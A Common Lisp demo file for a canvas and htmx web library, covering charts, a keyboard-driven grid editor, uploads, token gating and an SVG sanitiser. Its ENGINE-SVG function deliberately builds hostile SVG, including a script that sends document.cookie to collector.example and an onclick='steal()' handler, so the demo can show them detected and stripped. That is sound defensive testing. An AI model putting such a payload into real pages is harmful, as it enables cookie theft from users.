(in-package #:harness-demos-canvas)

;;; The canvas demo (H4h). A canvas is a plain function in this image: keyword
;;; strings in, a canvas-protocol tree out. Nothing is written to disk except the
;;; frozen dashboard.html and diagram.html.
;;;
;;; Sections 5-7 cover canvas-protocol 0.2.0: key bindings without eval
;;; (KEY-CHORD, :keys, canvas-keys.js), :sync and HX-SWAP-OOB; engine-generated
;;; SVG through SVG-FRAGMENT's allowlist; file uploads (FILE-INPUT, multipart
;;; forms, COERCE-PARAM :file). rpc-backend-htmx 0.2.0 carries both to the
;;; browser: the grid editor's full page loads canvas-keys.js (:page-keys), and
;;; binary file parts reach the handler as mime-protocol entities.
;;;
;;; Section 8 covers rpc-backend-htmx 0.3.0, which also serves every section:
;;; request names map to keywords with FIND-SYMBOL (a param a canvas does not
;;; take is a 400, more than :max-params is a 413, nothing is interned), a
;;; canvas with no parameters is called with none, and the canvas transport
;;; sends the brief's CSP and gates the app behind a one-time token itself.

;;; ---- Image state -----------------------------------------------------------

(defparameter *tests*                   ; assertions per system, this session's runs
  '((:system "policy-protocol" :tests 445) (:system "rpc-backend-htmx" :tests 258)
    (:system "canvas-backend-svg" :tests 495) (:system "compute-backend-unkernel" :tests 394)
    (:system "agent-eval" :tests 487)))

(defparameter *timings*                 ; harness/unkernel section 6, ms: (guest . host)
  '(("generic loop" 2052 . 262) ("fixnum loop" 163 . 47) ("cons/sort/GC" 5471 . 591)))

;;; engels as the canvas theme, plus the --chart-1..8 series rules. canvas-protocol
;;; 0.1.1 has only :placeholder (the :engels method is the H4h-0b minor).
(defmethod canvas:theme-stylesheet ((theme (eql :engels)))
  (stack-encoding:encode (concatenate 'string (engels:css :minify t) (string #\Newline)
                                             (canvas:chart-css))
                                :encoding :utf-8))

;;; ---- Canvases: plain functions ---------------------------------------------

(defun test-table (&key sort)
  "The header links carry sort= alone: the table has no :page-size, so canvas-protocol
0.2.2 leaves page= out (canvas-protocol#13), and the canvas takes only the param its
links send (rpc-backend-htmx 0.3.0 answers any other with a 400)."
  (canvas:table *tests*
                (list (canvas:column "System" :system :name "system" :sortable t)
                      (canvas:column "Assertions" :tests :name "tests" :sortable t :align :end))
                :id "tests" :link (canvas:canvas-link 'test-table) :sort sort
                :caption "Assertions per system (click a header to sort)"))

(defun test-chart (&key min)
  "Bar chart of the systems with at least MIN assertions."
  (multiple-value-bind (form errors)
      (canvas:coerce-form (list :min min) '((:min :integer :default 0 :min 0)))
    (let ((rows (remove-if (lambda (r) (< (getf r :tests) (getf form :min))) *tests*)))
      (canvas:el :div '(:id "chart")
                 (mapcar #'canvas:error-fragment errors)
                 (if rows
                     (canvas:make-chart :bar :title (format nil "Assertions (≥ ~d)" (getf form :min))
                       :series (list (canvas:make-series "assertions"
                                       (loop for r in rows collect (cons (getf r :system) (getf r :tests))))))
                     (canvas:el :p nil "No system has that many assertions."))))))

(defun threshold-form (&key (min "0"))
  "Posts to TEST-CHART; the response replaces only #chart."
  (canvas:form (list (canvas:number-input "min" :label "Minimum assertions" :value min :min 0)
                     (canvas:submit-button "Filter"))
               :link (canvas:canvas-link 'test-chart) :target "#chart" :swap :outer-html))

(defun timing-chart ()
  (canvas:make-chart :line :title "unkernel: SBCL workloads, guest vs host"
    :x-axis (canvas:make-axis :label "workload" :ticks '(1 2 3))
    :y-axis (canvas:make-axis :label "ms" :scale :log)
    :series (list (canvas:make-series "guest (wasm)" (loop for (nil g) in *timings* for i from 1 collect (cons i g)))
                  (canvas:make-series "host" (loop for (nil nil . h) in *timings* for i from 1 collect (cons i h))))))

(defun ticker (stream &key (n "3"))
  "SSE canvas: one <p> per event \"row\"."
  (dotimes (i (canvas:coerce-param n :integer :default 3 :min 1 :max 10))
    (rpc:rpc-send stream (canvas:fragment-event "row" (canvas:el :p nil (format nil "tick ~d: ~a ok" (1+ i) (getf (nth (mod i (length *tests*)) *tests*) :system)))))
    (sleep 0.1)))

(defun dashboard ()
  (canvas:el :main nil (canvas:stack
   (list (canvas:el :h1 nil "Canvas demo: this session's test runs")
         (canvas:grid (list (canvas:card (test-table) :title "Test counts")
                            (canvas:card (list (threshold-form) (test-chart)) :title "Filter"))
                      :columns 2)
         (canvas:card (timing-chart) :title "Timings")
         (canvas:card (canvas:live-region (canvas:canvas-link 'ticker :n "3") "row" :id "ticks" :swap :before-end
                                         :content (canvas:el :p nil "Ticks stream in here over SSE (the frozen file has none)."))
                      :title "Live (SSE)")))))

;;; ---- 0.2.0: a keyboard-driven grid editor -----------------------------------
;;; The cells and the selection live in the image. The editor <section> carries
;;; the bindings (data-canvas-keys, acted on by the same-origin canvas-keys.js),
;;; hx-sync queues key presses in order, and one response updates three panels:
;;; the grid (the hx-target), the status bar and the key log (both out of band).
;;; The section itself is never swapped, so its queue survives every response.

(defparameter +grid-size+ 4)
(defparameter +grid-moves+ '(("ArrowUp" -1 . 0) ("ArrowDown" 1 . 0) ("ArrowLeft" 0 . -1) ("ArrowRight" 0 . 1)))
(defparameter +grid-keys+
  (append (mapcar #'car +grid-moves+) '("Backspace")
          (loop for code from (char-code #\a) to (char-code #\z) collect (string (code-char code))))
  "The chords the editor binds, spelled as KEY-CHORD prints them.")
(defvar *cells*)
(defvar *cursor*)                       ; (row column), 0-based

(defun reset-grid ()
  (setf *cells* (make-array (list +grid-size+ +grid-size+) :initial-element nil)
        *cursor* (list 0 0)))

(defun apply-key (key)
  "An arrow moves the selection (clamped), Backspace clears the cell, a letter sets it."
  (destructuring-bind (row col) *cursor*
    (let ((move (cdr (assoc key +grid-moves+ :test #'string=))))
      (cond (move (setf *cursor* (list (max 0 (min (1- +grid-size+) (+ row (car move))))
                                       (max 0 (min (1- +grid-size+) (+ col (cdr move)))))))
            ((string= key "Backspace") (setf (aref *cells* row col) nil))
            (t (setf (aref *cells* row col) (string-upcase key)))))))

(defun grid-panel ()
  (canvas:el :table '(:id "grid" :role "grid" :aria-label "4 by 4 cells")
    (canvas:el :tbody nil
      (loop for r below +grid-size+
            collect (canvas:el :tr nil
                      (loop for c below +grid-size+
                            for selected = (equal *cursor* (list r c))
                            for v = (or (aref *cells* r c) "·")
                            collect (canvas:el :td (when selected '(:aria-selected "true"))
                                      (if selected (canvas:el :mark nil v) v))))))))

(defun status-bar (&key key oob)
  (destructuring-bind (row col) *cursor*
    (canvas:el :p (append '(:id "status" :role "status") (when oob (canvas:hx-swap-oob)))
      (format nil "Row ~d, column ~d · ~d of ~d cells set~@[ · last key ~a~]" (1+ row) (1+ col)
              (count-if-not #'null (make-array (array-total-size *cells*) :displaced-to *cells*))
              (array-total-size *cells*) key))))

(defun grid-editor ()
  "The editor. Each bound chord posts to GRID-KEY with the parameter key=<chord>."
  (canvas:el :section (append '(:id "editor" :aria-label "Grid editor")
                              (canvas:hx-post (canvas:canvas-link 'grid-key) :target "#grid" :swap :outer-html
                                              :keys +grid-keys+ :sync :queue-all))
    (grid-panel)
    (status-bar)
    (canvas:el :ol '(:id "log" :aria-label "Key log"))))

(defun grid-key (&key key)
  "One key press: the new grid for #grid, then the status bar and a log line out of band."
  (let ((key (canvas:coerce-param key :choice :field "key" :choices +grid-keys+ :required t)))
    (apply-key key)
    (list (grid-panel)
          (status-bar :key key :oob t)
          (canvas:el :ol (canvas:hx-swap-oob :swap :before-end :target "#log")
            (canvas:el :li nil (format nil "~a → row ~d, column ~d" key
                                       (1+ (first *cursor*)) (1+ (second *cursor*))))))))

;;; ---- 0.2.0: engine-generated SVG --------------------------------------------
;;; ENGINE-SVG stands in for a third-party renderer (a layout engine): SVG text
;;; with defs, symbols, <use>, groups with ids and transforms, a <style> block,
;;; and the kinds of content no page should run.

(defun engine-svg (&key (stages '("parse" "plan" "emit")))
  (let ((width (+ 40 (* 120 (length stages)))))
    (with-output-to-string (s)
      (format s "<?xml version=\"1.0\" encoding=\"UTF-8\"?>~%<!-- generated by a layout engine -->~%")
      (format s "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" version=\"1.1\" width=\"~d\" height=\"100\" viewBox=\"0 0 ~:*~d 100\" preserveAspectRatio=\"xMidYMid meet\">~%" width)
      (format s "  <title>Pipeline</title>~%  <style>.stage text { font: 14px sans-serif }</style>~%  <metadata>layout engine output</metadata>~%")
      (format s "  <defs>~%    <linearGradient id=\"stage-fill\" x1=\"0\" y1=\"0\" x2=\"0\" y2=\"1\" gradientUnits=\"objectBoundingBox\"><stop offset=\"0\" stop-color=\"#ffffff\"/><stop offset=\"1\" stop-color=\"#d9d9d9\"/></linearGradient>~%")
      (format s "    <marker id=\"arrow\" viewBox=\"0 0 10 10\" refX=\"9\" refY=\"5\" markerWidth=\"6\" markerHeight=\"6\" orient=\"auto\"><path d=\"M0,0 L10,5 L0,10 z\" fill=\"currentColor\"/></marker>~%")
      (format s "    <symbol id=\"stage-box\" viewBox=\"0 0 80 40\"><rect width=\"80\" height=\"40\" rx=\"6\" fill=\"url(#stage-fill)\" stroke=\"currentColor\"/></symbol>~%  </defs>~%")
      (format s "  <g id=\"stages\" class=\"stage\" transform=\"translate(20,30)\">~%")
      (loop for name in stages for i from 0
            do (format s "    <g id=\"stage-~d\" transform=\"translate(~d,0)\"~:[~; onclick=\"steal()\"~]><use ~:[href~;xlink:href~]=\"#stage-box\" width=\"80\" height=\"40\"/><text x=\"40\" y=\"25\" text-anchor=\"middle\" fill=\"currentColor\">~a</text></g>~%"
                       (1+ i) (* 120 i) (= i 1) (= i 2) name))
      (format s "  </g>~%  <g id=\"edges\" fill=\"none\" stroke=\"currentColor\">~%")
      (loop for i from 1 below (length stages)
            do (format s "    <path d=\"M~d,50 H~d\" marker-end=\"url(#arrow)\"/>~%" (- (* 120 i) 20) (+ (* 120 i) 18)))
      (format s "  </g>~%  <script>fetch('https://collector.example/?c=' + document.cookie)</script>~%")
      (format s "  <foreignObject x=\"0\" y=\"0\" width=\"10\" height=\"10\"><div xmlns=\"http://www.w3.org/1999/xhtml\">hi</div></foreignObject>~%")
      (format s "  <use href=\"https://cdn.example/sprites.svg#logo\" x=\"~d\" y=\"0\"/>~%" (- width 30))
      (format s "  <rect id=\"badge\" x=\"~d\" y=\"80\" width=\"20\" height=\"10\" fill=\"url(https://cdn.example/paint.svg#p)\" hx-get=\"/admin\"/>~%</svg>~%" (- width 30)))))

(defun engine-violations ()
  "What SVG-FRAGMENT refuses in the engine's output (NIL when nothing)."
  (handler-case (progn (canvas:svg-fragment (engine-svg)) nil)
    (canvas:unsafe-svg (c) (canvas:csp-error-violations c))))

(defun safe-diagram ()
  "The engine's SVG through the allowlist, the offending parts stripped, sized by viewBox only."
  (handler-bind ((canvas:unsafe-svg (lambda (c) (declare (ignore c)) (invoke-restart 'canvas:strip-violations))))
    (canvas:svg-fragment (engine-svg) :attrs '(:width nil :height nil :role "img" :aria-label "Pipeline: parse, plan, emit"))))

(defun diagram ()
  (canvas:el :main nil
    (canvas:stack
     (list (canvas:el :h1 nil "Engine SVG, embedded")
           (canvas:card (safe-diagram) :title "Pipeline (from the layout engine)")
           (canvas:card (canvas:el :ul nil
                          (loop for v in (engine-violations)
                                collect (canvas:el :li nil (canvas:el :code nil (format nil "~(~a~)" (getf v :kind)))
                                                   (format nil " on <~a>~@[ ~a~]" (getf v :element) (getf v :attribute)))))
                        :title "Stripped by svg-fragment")))))

;;; ---- 0.2.0: file uploads -----------------------------------------------------

(defparameter +image-accept+ "image/png,.svg")
(defparameter +max-image-bytes+ 4096)

(defvar *last-images* nil
  "The IMAGES value UPLOAD-IMAGES was last called with, kept so the demo can print what arrived.")

(defun upload-form ()
  (canvas:form (list (canvas:file-input "images" :label "Images (PNG or SVG, at most 4 KiB each)"
                                                 :accept +image-accept+ :multiple t :required t)
                     (canvas:submit-button "Upload"))
               :id "upload" :link (canvas:canvas-link 'upload-images)))

(defun hex-head (octets &optional (n 8))
  "The first N octets of OCTETS in hex."
  (format nil "~{~2,'0X~^ ~}~:[~; …~]" (coerce (subseq octets 0 (min n (length octets))) 'list) (> (length octets) n)))

(defun upload-images (&key images)
  "The form's handler. IMAGES is what the codec decoded: one STACK-MIME:MIME-ENTITY, a
list of them (several files under one name) or NIL (missing). COERCE-PARAM :file
signals a CANVAS-COERCION-ERROR for a bad file, which the transport answers with 422."
  (setf *last-images* images)
  (canvas:el :ul '(:id "upload")
    (loop for f in (canvas:coerce-param images :file :field "images" :required t :multiple t
                                        :max-size +max-image-bytes+ :accept +image-accept+)
          collect (canvas:el :li nil (format nil "~a: ~a, ~d bytes, ~a" (canvas:uploaded-file-filename f)
                                             (canvas:uploaded-file-media-type f) (canvas:uploaded-file-size f)
                                             (hex-head (canvas:uploaded-file-octets f)))))))

;;; ---- Server: allowlist, token gate, CSP -------------------------------------
;;; Both are rpc-backend-htmx 0.3.0 options. The canvas transport sends the
;;; brief's Content-Security-Policy on every response, SSE included (:csp
;;; defaults to T there), and HTMX-APP :token gates every request: the one-time
;;; URL is exchanged for a separate per-app session secret in an HttpOnly,
;;; SameSite=Strict cookie, then a 303 to the clean URL.

(defparameter *handlers*
  (rh:make-htmx-handlers 'dashboard 'test-table 'test-chart 'threshold-form '(ticker :mode :call-stream)
                         'grid-editor 'grid-key 'diagram 'upload-form 'upload-images))
(defvar *transport* (rhc:make-canvas-htmx-transport :page-title "canvas demo" :page-keys '(grid-editor))
  "The server's transport. Only the grid editor binds keys, so only its full page loads canvas-keys.js.")
(defvar *plain-transport* (rhc:make-canvas-htmx-transport :page-title "canvas demo")
  "The same transport without :page-keys, for comparison in section 5.")

(defvar *secrets* '()
  "This run's bootstrap token and every session secret the app handed out, so the run can
check that none of them was printed.")

(defun gated-app (token)
  "The canvas app behind the token gate. Each app has its own session secret and takes
exactly one exchange of TOKEN."
  (rh:htmx-app *transport* *handlers* :token token))

(defun page-path (name &optional (query ""))
  (format nil "~a~a~a" (rh:htmx-transport-prefix *transport*) (rh:htmx-method-name name) query))

(defun first-value (v) (if (listp v) (first v) v))

(defun cookie-pair (set-cookie)
  "The name=value part of SET-COOKIE: what a browser sends back."
  (subseq set-cookie 0 (position #\; set-cookie)))

(defun cookie-shape (set-cookie)
  "SET-COOKIE with its value replaced by the value's length, for printing."
  (let* ((end (or (position #\; set-cookie) (length set-cookie)))
         (eq (position #\= set-cookie :end end)))
    (format nil "~a=<~d chars>~a" (subseq set-cookie 0 eq) (- end eq 1) (subseq set-cookie end))))

(defun cookie-value (set-cookie)
  (let ((pair (cookie-pair set-cookie))) (subseq pair (1+ (position #\= pair)))))

(defun remember-secret (set-cookie)
  "SET-COOKIE, after noting its value in *SECRETS*."
  (push (cookie-value set-cookie) *secrets*)
  set-cookie)

(defun login (app token)
  "Open APP's one-time URL in process, as a browser would. → (values client headers): an
htmx-client on APP and the session cookie as a request header (never printed)."
  (let* ((c (rh:make-htmx-client app :codec (rh:htmx-transport-codec *transport*)))
         (r (rh:htmx-request-url c (rh:htmx-token-url (page-path 'dashboard) token) :hx-request nil))
         (set-cookie (first-value (rh:htmx-reply-header r "set-cookie"))))
    (assert (and (= 303 (rh:htmx-reply-status r)) set-cookie) () "the exchange answered ~d" (rh:htmx-reply-status r))
    (values c `(("cookie" . ,(cookie-pair (remember-secret set-cookie)))))))

;;; ---- Driving it -------------------------------------------------------------

(defun banner (title) (format t "~&~%~72,,,'=a~%== ~a~%~72,,,'=a~%" "" title ""))
(defun clip (s &optional (n 700)) (if (> (length s) n) (format nil "~a … [~d chars]" (subseq s 0 n) (length s)) s))
(defun redact (s token)
  (let* ((s (format nil "~{~a~^, ~}" (if (listp s) s (list s)))) (i (search token s)))
    (if i (concatenate (quote string) (subseq s 0 i) "<token>" (subseq s (+ i (length token)))) s)))
(defun text (body) (if (stringp body) body (stack-encoding:decode-octets body :encoding :utf-8)))
(defun url (port name &optional (query "")) (format nil "http://127.0.0.1:~d~a" port (page-path name query)))

(defun get* (url &rest headers)
  (let ((r (http:request :get url :headers headers :timeout 10 :max-redirects 0)))
    (values (hp:response-status r) (text (hp:response-body r)) r)))

(defun demo-in-process (token)
  (banner "1. In-process htmx client (no socket): fragments, the form, SSE, the allowlist")
  (multiple-value-bind (c cookie) (login (gated-app token) token)
    (format t "(the app is gated: the client opened its one-time URL first and sends the session cookie; section 8 shows the exchange)~%")
    (flet ((call (name params &rest keys)
             (let ((r (apply #'rh:htmx-request c (rh:htmx-method-name name) params :headers cookie keys)))
               (format t "~&~a ~s → ~d~%  ~a~%" name params (rh:htmx-reply-status r) (clip (text (rh:htmx-reply-body r)) 500))
               r)))
      (call 'test-table '(:sort "-tests"))
      (call 'threshold-form '(:min "400"))
      (call 'test-chart '(:min "400") :http-method :post)
      (call 'test-chart '(:min "lots") :http-method :post)
      (format t "~&ticker (Accept: text/event-stream) → events ~s~%"
              (rh:htmx-reply-events (call 'ticker '(:n "3") :accept "text/event-stream")))
      (format t "~&not in the allowlist: CL-USER::SECRET → ~d~%"
              (rh:htmx-reply-status (rh:htmx-request c "COMMON-LISP-USER::SECRET" nil :headers cookie))))))

(defun demo-http (port token)
  (banner "2. Real HTTP (http-backend-async on libuv) against Hunchentoot on 127.0.0.1")
  (format t "no token        → ~d~%" (get* (url port 'dashboard)))
  (let ((one-time (rh:htmx-token-url (url port 'dashboard) token)))
    (multiple-value-bind (status body r) (get* one-time)
      (declare (ignore body))
      (format t "one-time URL    ~a~%                → ~d, Location ~a~%                  Set-Cookie ~a~%" (redact one-time token) status
              (hp:response-header r "location") (cookie-shape (remember-secret (first-value (hp:response-header r "set-cookie"))))))
    (let ((hp:*http-client* (hp:make-http-client hp:*http-backend*))) ; a client without the cookie
      (format t "same URL again, another client → ~d (the URL token is spent)~%" (get* one-time))))
  (multiple-value-bind (status body r) (get* (url port 'dashboard))
    (format t "~&GET dashboard (no HX-Request: full page) → ~d ~a~%Content-Security-Policy: ~a~%~a~%"
            status (hp:response-header r "content-type") (hp:response-header r "content-security-policy") (clip body 900))
    (let ((i (search "<div id=\"ticks\"" body))) (format t "~&the live region in that page: ~a~%" (subseq body i (+ 6 (search "</div>" body :start2 i)))))
    (format t "~&csp-violations of the served dashboard tree: ~s~%" (let ((canvas:*canvas-resolver* (rhc:make-htmx-resolver *transport* *handlers*))) (canvas:csp-violations (dashboard)))))
  (let ((r (http:request :post (url port 'test-chart) :form-data '(("min" . "450")) :headers '(("hx-request" . "true")) :timeout 10)))
    (format t "~&form submit: POST min=450 to TEST-CHART (HX-Request) → ~d~%  ~a~%" (hp:response-status r) (clip (text (hp:response-body r)) 400)))
  (multiple-value-bind (status body) (get* (url port 'ticker) '("accept" . "text/event-stream"))
    (format t "~&SSE ticker → ~d~%~a" status body))
  (format t "~&asset htmx.min.js → ~d (served from 'self', htmx ~a)~%" (get* (format nil "http://127.0.0.1:~d/canvas-assets/htmx.min.js" port)) canvas:+htmx-version+))

(defun demo-redefine (port)
  (banner "4. Redefine the chart canvas live: no restart, the next request shows it")
  (let ((before (nth-value 1 (get* (url port 'test-chart) '("hx-request" . "true"))))
        (form '(defun test-chart (&key min)
                (declare (ignore min))
                (canvas:el :div '(:id "chart")
                  (canvas:make-chart :scatter :title "Assertions (redefined: scatter, vermillion)"
                    :series (list (canvas:make-series "assertions" (loop for r in *tests* for i from 1 collect (cons i (getf r :tests)))
                                                      :color "#D55E00")))))))
    (let ((*package* (find-package :harness-demos-canvas))) (let ((*print-case* :downcase)) (format t "~s~%" form)) (eval form))
    (let ((after (nth-value 1 (get* (url port 'test-chart) '("hx-request" . "true")))))
      (format t "before: ~a~%after:  ~a~%" (subseq before 0 60) (subseq after 0 60))
      (format t "bar before: ~s, scatter after: ~s, color=\"#D55E00\" after: ~s~%"
              (and (search "data-chart=\"bar\"" before) t) (and (search "data-chart=\"scatter\"" after) t) (and (search "color=\"#D55E00\"" after) t)))))

(defun demo-freeze (dir)
  (banner "3. freeze: the dashboard as one self-contained static file")
  (let* ((html (canvas:freeze 'dashboard :title "Canvas demo"))
         (path (merge-pathnames "dashboard.html" dir)))
    (with-open-file (o path :direction :output :if-exists :supersede :external-format :utf-8) (write-string html o))
    (format t "wrote dashboard.html: ~d chars, deterministic: ~s~%" (length html) (string= html (canvas:freeze 'dashboard :title "Canvas demo")))
    (dolist (needle '("http:" "https:" "//" "url(" "@import" "<script" "<link" "hx-" "sse-"))
      (format t "  ~10a ~d occurrence~:p~%" needle (loop for i = (search needle html) then (search needle html :start2 (1+ i)) while i count t)))
    path))

;;; ---- Driving the 0.2.0 sections ---------------------------------------------

(defvar *checks* '() "(name . boolean), newest first: the 0.2.0 self-check.")
(defun check (name value) (push (cons name (and value t)) *checks*) value)

(defun app-resolved (fn)
  "FN called under the server's resolver, so links and assets render as the app serves them."
  (let ((canvas:*canvas-resolver* (rhc:make-htmx-resolver *transport* *handlers*))) (funcall fn)))

(defun count-of (needle s) (loop for i = (search needle s) then (search needle s :start2 (1+ i)) while i count t))
(defun scripts-of (html)
  "Each <script …></script> element of HTML, as text, in order."
  (loop for i = (search "<script" html) then (search "<script" html :start2 (1+ i)) while i
        collect (subseq html i (+ 9 (search "</script>" html :start2 i)))))
(defun without (needle s)
  "S with its first NEEDLE removed."
  (let ((i (search needle s))) (if i (concatenate 'string (subseq s 0 i) (subseq s (+ i (length needle)))) s)))
(defun lines-after (s &rest closers)
  "S with a newline after each CLOSER, for printing a response of several panels."
  (with-output-to-string (o)
    (loop with i = 0
          for hit = (let ((ends (loop for c in closers for j = (search c s :start2 i) when j collect (+ j (length c)))))
                      (and ends (reduce #'min ends)))
          while hit do (format o "  ~a~%" (subseq s i hit)) (setf i hit)
          finally (when (< i (length s)) (format o "  ~a~%" (subseq s i))))))

(defun demo-keys (token)
  (banner "5. A keyboard-driven grid editor: key chords, hx-sync, hx-swap-oob (0.2.0)")
  (reset-grid)
  (format t "key-chord spells a binding the way canvas-keys.js reports the key press:~%")
  (dolist (s '("arrowup" "ctrl+Z" "Shift+a" "control+alt+delete" "space" "Plus"))
    (format t "  ~22s → ~s~%" s (canvas:key-chord s)))
  (dolist (s '("Shift+/" "Ctrl++" "Hyper+x"))
    (format t "  ~22s → refused: ~a~%" s (handler-case (canvas:key-chord s) (canvas:canvas-error (c) c))))
  (let* ((session (multiple-value-list (login (gated-app token) token)))
         (c (first session))
         (cookie (second session))
         (editor (app-resolved (lambda () (canvas:to-html (grid-editor))))))
    (format t "~&~%the editor as served: the <section> holds the bindings, the queue and the target~%  ~a~%" editor)
    (check :keys-bound (search "data-canvas-keys=\"ArrowUp ArrowDown ArrowLeft ArrowRight Backspace a b" editor))
    (check :queue-all (search "hx-sync=\"this:queue all\"" editor))
    (let ((v (app-resolved (lambda () (canvas:csp-violations (grid-editor))))))
      (format t "csp-violations of the editor tree: ~s~%" v)
      (check :editor-csp-clean (null v)))
    (flet ((full-page (client name &optional headers) ; a plain browser GET: no HX-Request, the whole page
             (text (rh:htmx-reply-body (rh:htmx-request client (rh:htmx-method-name name) nil :hx-request nil :headers headers)))))
      (let* ((plain (rh:make-htmx-client (rh:htmx-app *plain-transport* *handlers*) :codec (rh:htmx-transport-codec *plain-transport*)))
             (page (full-page c 'grid-editor cookie))
             (plain-page (full-page plain 'grid-editor))
             (tag (format nil "<script src=\"~acanvas-keys.js\"></script>" (rhc:canvas-transport-asset-prefix *transport*))))
        (format t "~&the server's transport: (make-canvas-htmx-transport :page-title \"canvas demo\" :page-keys '(grid-editor))~%  canvas-transport-page-keys → ~s~%"
                (rhc:canvas-transport-page-keys *transport*))
        (format t "GET grid-editor as a full page (no HX-Request) → its <head> loads, from the asset prefix ~a:~%"
                (rhc:canvas-transport-asset-prefix *transport*))
        (dolist (s (scripts-of page)) (format t "  ~a~%" s))
        (check :keys-script (search (format nil "~a</head>" tag) page))
        (format t "the same GET through a transport made without :page-keys (the page 0.1.0 served):~%")
        (dolist (s (scripts-of plain-page)) (format t "  ~a~%" s))
        (format t "  = the keyed page without that one <script>: ~s~%"
                (check :plain-page-unchanged (string= plain-page (without tag page))))
        (let ((dash (full-page c 'dashboard cookie)))
          (format t "GET dashboard (not in page-keys) → canvas-keys.js in it: ~s; byte-identical to the page without :page-keys: ~s~%"
                  (and (search "canvas-keys.js" dash) t)
                  (check :unlisted-unchanged (string= dash (full-page plain 'dashboard)))))))
    (let ((r (rh:htmx-request-url c (app-resolved (lambda () (canvas:resolve-asset-url canvas:*canvas-resolver* "canvas-keys.js")))
                                  :hx-request nil :headers cookie)))
      (format t "GET the asset canvas-keys.js → ~d ~a, ~d bytes, from 'self'~%" (rh:htmx-reply-status r)
              (rh:htmx-reply-header r "content-type") (length (rh:htmx-reply-body r))))
    (format t "~&~%three key presses, as htmx sends them after canvas-keys.js fires canvas:key on #editor:~%")
    (dolist (key '("ArrowRight" "ArrowDown" "k"))
      (let ((r (rh:htmx-request c (rh:htmx-method-name 'grid-key) (list :key key) :http-method :post
                                :target "grid" :trigger "editor" :headers cookie)))
        (format t "~&POST GRID-KEY key=~a (HX-Request: true, HX-Trigger: editor, HX-Target: grid) → ~d~%~a"
                key (rh:htmx-reply-status r) (lines-after (text (rh:htmx-reply-body r)) "</table>" "</p>"))
        (check :oob-panels (and (search "<p id=\"status\" role=\"status\" hx-swap-oob=\"true\">" (text (rh:htmx-reply-body r)))
                                (search "<ol hx-swap-oob=\"beforeend:#log\">" (text (rh:htmx-reply-body r)))))))
    (check :cell-set (equal (aref *cells* 1 1) "K"))
    (let ((r (rh:htmx-request c (rh:htmx-method-name 'grid-key) '(:key "F5") :http-method :post :headers cookie)))
      (format t "~&an unbound chord sent by hand: POST GRID-KEY key=F5 → ~d~%  ~a~%" (rh:htmx-reply-status r) (text (rh:htmx-reply-body r)))
      (check :unbound-422 (= 422 (rh:htmx-reply-status r)))))
  (format t "~&~%a [filter] trigger is refused:~%")
  (let ((c (handler-case (app-resolved (lambda () (canvas:hx-post (canvas:canvas-link 'grid-key) :trigger "keydown[key=='ArrowUp'] from:body")))
             (canvas:canvas-csp-error (c) c))))
    (format t "  (hx-post … :trigger \"keydown[key=='ArrowUp'] from:body\") → ~a~%    ~a~%    violations ~s~%"
            (type-of c) c (and (typep c 'canvas:canvas-csp-error) (canvas:csp-error-violations c)))
    (check :filter-refused (typep c 'canvas:canvas-csp-error)))
  (format t "  csp-violations of a raw <div hx-trigger=\"keydown[key=='ArrowUp']\">: ~s~%"
          (canvas:csp-violations (stack-html:make-html-element "div" :attributes '(("hx-trigger" . "keydown[key=='ArrowUp']")))))
  (let* ((page (app-resolved (lambda () (canvas:to-html (canvas:page (grid-editor) :keys t)))))
         (i (search "<meta name=\"htmx-config\"" page)))
    (format t "  why: htmx runs an event filter as JavaScript (the Function constructor), which needs 'unsafe-eval'.~%  The CSP has none: ~a~%  and every canvas page sets allowEval false, under which htmx 2.0.11 lets a filter match every event:~%    ~a~%  canvas-keys.js matches chords from 'self' and evaluates nothing.~%"
            (rh:htmx-transport-csp *transport*) (subseq page i (1+ (search ">" page :start2 i))))))

(defun demo-svg (dir)
  (banner "6. Engine-generated SVG through svg-fragment's allowlist (0.2.0)")
  (let ((source (engine-svg)))
    (format t "the engine's output (~d chars):~%~a" (length source) source)
    (let* ((tree (handler-bind ((canvas:unsafe-svg
                                  (lambda (c)
                                    (format t "~&svg-fragment signals ~a (a ~a) with ~d violations, in document order:~%"
                                            (type-of c) 'canvas:canvas-csp-error (length (canvas:csp-error-violations c)))
                                    (dolist (v (canvas:csp-error-violations c)) (format t "  ~s~%" v))
                                    (check :unsafe-svg (= 6 (length (canvas:csp-error-violations c))))
                                    (format t "restart ~s offered: ~s → invoked~%" 'canvas:strip-violations
                                            (and (find-restart 'canvas:strip-violations c) t))
                                    (invoke-restart 'canvas:strip-violations))))
                   (canvas:svg-fragment source)))
           (html (canvas:to-html tree)))
      (format t "~&~%the cleaned tree (to-html, ~d chars):~%~a~%" (length html) html)
      (format t "~&kept:~%")
      (dolist (needle '("id=\"stage-fill\"" "id=\"arrow\"" "id=\"stage-box\"" "id=\"stages\"" "id=\"stage-2\"" "id=\"badge\""
                        "viewBox=" "preserveAspectRatio=" "<linearGradient" "gradientUnits=" "refX=" "markerWidth="
                        "<use href=\"#stage-box\"" "fill=\"url(#stage-fill)\"" "transform=\"translate(120,0)\""))
        (format t "  ~30a ~d~%" needle (count-of needle html)))
      (format t "gone:~%")
      (dolist (needle '("<style" "<metadata" "<script" "<foreignObject" "onclick" "hx-get" "https:" "xlink" "version=" "<!--"))
        (format t "  ~30a ~d~%" needle (count-of needle html)))
      (check :ids-camel-kept (and (search "id=\"stage-box\"" html) (search "viewBox=" html) (search "markerWidth=" html)
                                  (= 3 (count-of "<use href=\"#stage-box\"" html))))
      (check :stripped (every (lambda (n) (zerop (count-of n html))) '("<style" "<script" "<foreignObject" "onclick" "hx-get" "https:")))
      (format t "csp-violations of the cleaned tree: ~s; neutralize leaves it unchanged: ~s; svg-fragment of its own output gives the same text: ~s~%"
              (canvas:csp-violations tree) (string= html (canvas:to-html (canvas:neutralize tree)))
              (check :round-trip (string= html (canvas:to-html (canvas:svg-fragment html)))))))
  (let ((doc (app-resolved (lambda () (canvas:page (diagram) :title "Engine SVG")))))
    (let ((v (canvas:csp-violations doc)))
      (format t "csp-violations of the final page (page + the stripped diagram): ~s~%" v)
      (check :page-csp-clean (null v))))
  (let* ((html (canvas:freeze 'diagram :title "Engine SVG"))
         (path (merge-pathnames "diagram.html" dir)))
    (with-open-file (o path :direction :output :if-exists :supersede :external-format :utf-8) (write-string html o))
    (format t "~&freeze 'diagram → wrote diagram.html: ~d chars, deterministic: ~s~%" (length html)
            (check :freeze-deterministic (string= html (canvas:freeze 'diagram :title "Engine SVG"))))
    (dolist (needle '("<script" " onclick=" "<foreignObject" "https:" "http:" "hx-get=" "url(#" "viewBox=" "<style"))
      (format t "  ~14a ~d~%" needle (count-of needle html)))
